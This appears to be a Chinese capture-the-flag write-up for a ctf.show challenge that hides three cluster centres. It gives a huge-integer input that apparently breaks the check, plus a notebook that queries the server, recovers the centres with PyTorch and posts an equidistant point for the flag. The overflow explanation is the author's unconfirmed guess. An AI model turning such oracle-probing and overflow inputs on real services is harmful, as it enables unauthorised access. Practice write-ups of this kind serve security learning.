    distance =[numpy.linalg.norm(A-data) for A in pData]
    avgdist = numpy.mean(numpy.abs(distance - numpy.mean(distance))**2)
    if avgdist<0.001:
        msg= flag
    else:
        msg= f"您的数据与三个聚类中心的欧拉距离分别是<br><br>{distance}均方差为:{avgdist}"
except:
    msg="未提交数据或数据维度有误"
```

#### 题目分析

```
这段代码的目的是对从请求中获取的数据进行处理，并计算数据与三个聚类中心的欧拉距离和均方差。
先生成三个D维向量，然后当提交一个向量时，会返回提交的向量与这三个向量的欧拉距离，当提交向量与这三个向量距离的平均值小于0.001时，显示flag。
```

#### payload

```
在理论上，NumPy可以处理任意大小的整数，包括非常大的整数。然而，在实际应用中，NumPy的整数类型的范围受限于计算机的内存和处理能力。

NumPy提供了不同精度的整数类型，如int8、int16、int32、int64等，以及对应的无符号整数类型。这些类型在存储整数时具有不同的位数和取值范围。例如，int64类型可以表示范围在-9223372036854775808到9223372036854775807之间的整数。
```

```
numpy处理数据，
直接超大数9999999999999999999999999999999999999999999999999999999999999999999999
得到flag
这里好像利用的就是numpy没办法处理这么大的数，所以满足了平均值小于0.001，得出了flag？
```

#### 官方payload

试了半天，没整明白，先放着吧

1、先用随机数的方法，生成若干向量进行试探。取得这些向量与三个指定点的欧拉距离

```python
rx=[ np.random.random(D)*100 for i in range(500)]
ry=[]
for i in tqdm.tqdm(rx):
    try:
        txt = requests.post(url,data={'data[]':list(i)}).text
        # print(txt)
        ry.append(eval(re.findall("(\[.*\])",txt)[0]))
        if "flag" in txt:
            print(txt)
            break
    except :
        print(txt)
        break
ry = np.array(ry)
```

 2、使用一个畸形神经网络，求值。

```python
class CTFNN(nn.Module):
    def __init__(self,D):
        super().__init__()
        self.L = nn.Linear(1,D)
        self.zero=torch.zeros(1)
    def forward(self, x):
        y = self.L(self.zero)
        return torch.linalg.norm(y-x)
class loss(nn.Module):
    def __init__(self,*arc):
        super().__init__()
    def forward(self,x,y):
        return torch.abs(x-y)
```

训练之后，ctfmodel.L.bias.tolist() 即为所求点坐标。

3、用另一个神经网络训练出一个距离三个点距离相等的点来。

```python
class CTFNN2(nn.Module):
    def __init__(self,D):
        super().__init__()
        self.L = nn.Linear(1,D)
        self.zero=torch.zeros(1)
    def forward(self):
        x = self.L(self.zero)
        dist =[torch.linalg.norm(A-x) for A in tp]
        dist=torch.stack(dist,0)
        y = torch.mean(torch.abs(dist - torch.mean(dist))**2)
        return y
    
class loss2(nn.Module):
    def __init__(self,*arc):
        super().__init__()
    def forward(self,x):
        return torch.abs(x)
```

脚本

```python
{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": None,
   "metadata": {
    "collapsed": False,
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "import requests\n",
    "import numpy as np\n",
    "import re\n",
    "import tqdm\n",
    "url='http://49aa75ee-ea3f-4e12-b75f-ae589cf98959.challenge.ctf.show/'\n",
    "for D in range(100,200):\n",
    "     txt = requests.post(url,data={'data[]':[1]*D}).text\n",
    "     if '维度有误' not in txt :\n",
    "        # print(txt)\n",
    "        break\n",
    "print('D=',D)\n",
    "rx=[ np.random.random(D)*100 for i in range(500)]\n",
    "ry=[]\n",
    "\n",
    "for i in tqdm.tqdm(rx):\n",
    "    try:\n",
    "        txt = requests.post(url,data={'data[]':list(i)}).text\n",
    "        # print(txt)\n",
    "        ry.append(eval(re.findall(\"(\\[.*\\])\",txt)[0]))\n",
    "        if \"flag\" in txt:\n",
    "            print(txt)\n",
    "            break\n",
    "    except :\n",
    "        print(txt)\n",
    "        break\n",
    "ry = np.array(ry)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": None,
   "metadata": {
    "collapsed": False,
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "import torch, torch.nn as nn, torch.optim as optim\n",
    "from torch.utils.data import DataLoader,Dataset,TensorDataset\n",
    "class CTFNN(nn.Module):\n",
    "    def __init__(self,D):\n",
    "        super().__init__()\n",
    "        self.L = nn.Linear(1,D)\n",
    "        self.zero=torch.zeros(1)\n",
    "    def forward(self, x):\n",
    "        y = self.L(self.zero)\n",
    "        return torch.linalg.norm(y-x)\n",
    "class loss(nn.Module):\n",
    "    def __init__(self,*arc):\n",
    "        super().__init__()\n",
    "    def forward(self,x,y):\n",
    "        return torch.abs(x-y)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": False,
    "pycharm": {
     "name": "#%% md\n"
    }
   },
   "source": [
    "int"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": None,
   "metadata": {
    "collapsed": False,
    "pycharm": {
     "is_executing": True,
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "import matplotlib.pyplot as plt\n",
    "p=[]\n",
    "for idx in range(3):\n",
    "    ctf =CTFNN(D)\n",
    "    los = []\n",
    "    loss_function = loss()\n",
    "    optimizer = torch.optim.Adam(ctf.parameters(),lr=10)\n",
    "    tx = torch.tensor(rx)\n",
    "    ty = torch.tensor(ry[:,idx])\n",
    "    td = TensorDataset(tx,ty)\n",
    "    loss_fn = loss()\n",
    "    for ep in tqdm.trange(150):\n",
    "        if ep == 10:\n",
    "            optimizer = torch.optim.Adam(ctf.parameters(),lr=1)\n",
    "        if ep == 40:\n",
    "            los=[]\n",
    "            optimizer = torch.optim.Adam(ctf.parameters(),lr=0.1)\n",
    "        if ep == 80:\n",
    "            optimizer = torch.optim.Adam(ctf.parameters(),lr=0.01)\n",
    "        if ep == 130:\n",
    "            optimizer = torch.optim.Adam(ctf.parameters(),lr=0.001)\n",
    "        for i in td:\n",
    "            optimizer.zero_grad()\n",
    "            y = ctf(i[0])\n",
    "            lx = loss_fn(y,i[1])\n",
    "            lx.backward()\n",
    "            optimizer.step()\n",
    "        los.append(lx.item())\n",
    "    plt.figure(figsize=(10,3))\n",
    "    plt.plot(los)\n",
    "    plt.show()\n",
    "    print(los[-1])\n",
    "    p.append( ctf.L.bias.tolist())\n",
    "for px in p:\n",
    "    txt = requests.post(url,data={'data[]':px}).text\n",
    "    print(re.findall('您的数据与三个聚类中心的欧拉距离分别是:<br><br>(.*)均方差为',txt)[0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": None,
   "metadata": {},
   "outputs": [],
   "source": [
    "class CTFNN2(nn.Module):\n",
    "    def __init__(self,D):\n",
    "        super().__init__()\n",
    "        self.L = nn.Linear(1,D)\n",
    "        self.zero=torch.zeros(1)\n",
    "    def forward(self):\n",
    "        x = self.L(self.zero)\n",
    "        dist =[torch.linalg.norm(A-x) for A in tp]\n",
    "        dist=torch.stack(dist,0)\n",
    "        y = torch.mean(torch.abs(dist - torch.mean(dist))**2)\n",
    "        return y\n",
    "    \n",
    "class loss2(nn.Module):\n",
    "    def __init__(self,*arc):\n",
    "        super().__init__()\n",
    "    def forward(self,x):\n",
    "        return torch.abs(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": None,
   "metadata": {
    "collapsed": False,
    "pycharm": {
     "is_executing": True,
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "tp=[]\n",
    "tp.append(torch.tensor(p[0]))\n",
    "tp.append(torch.tensor(p[1]))\n",
    "tp.append( torch.tensor(p[2]))\n",
    "\n",
    "ctf2 =CTFNN2(D)\n",
    "loss_function = loss2()\n",
    "optimizer = torch.optim.Adam(ctf2.parameters(),lr=5)\n",
    "tx = torch.tensor(rx)\n",
    "ty = torch.tensor(ry[:,2])\n",
    "td = TensorDataset(tx,ty)\n",
    "\n",
    "los=[]\n",
    "loss_fn = loss2()\n",
    "for ep in tqdm.trange(150):\n",
    "    if ep == 10:\n",
    "        optimizer = torch.optim.Adam(ctf2.parameters(),lr=1)\n",
    "    if ep == 40:\n",
    "        optimizer = torch.optim.Adam(ctf2.parameters(),lr=0.1)\n",
    "    if ep == 80:\n",
    "        los=[]\n",
    "        optimizer = torch.optim.Adam(ctf2.parameters(),lr=0.01)\n",
    "    if ep == 130:\n",
    "        optimizer = torch.optim.Adam(ctf2.parameters(),lr=0.001)\n",
    "    for i in range(100):\n",
    "        optimizer.zero_grad()\n",
    "        y = ctf2()\n",
    "        lx = loss_fn(y)\n",
    "        lx.backward()\n",
    "        optimizer.step()\n",
    "    los.append(lx.item())\n",
    "import matplotlib.pyplot as plt\n",
    "plt.figure(figsize=(10,3))\n",
    "plt.plot(los)\n",
    "print(los[-1])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": None,
   "metadata": {
    "collapsed": False,
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "px = ctf2.L.bias.tolist()\n",
    "txt =requests.post(url,data={'data[]':px}).text.replace('\\n','<br>')\n",
    "# print(txt)\n",
    "txt = re.findall(r'#6a91c6;\">(.*)</blockquote>',txt)[0].replace('<br>','\\n').replace('\\n\\n','\\n')\n",
    "print(txt)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.4 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.7"
  },
  "vscode": {
   "interpreter": {
    "hash": "3bd13bc16400e16874b7ce28af58a129343287e94248a182c1f06fbb6b76ef8e"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}
```

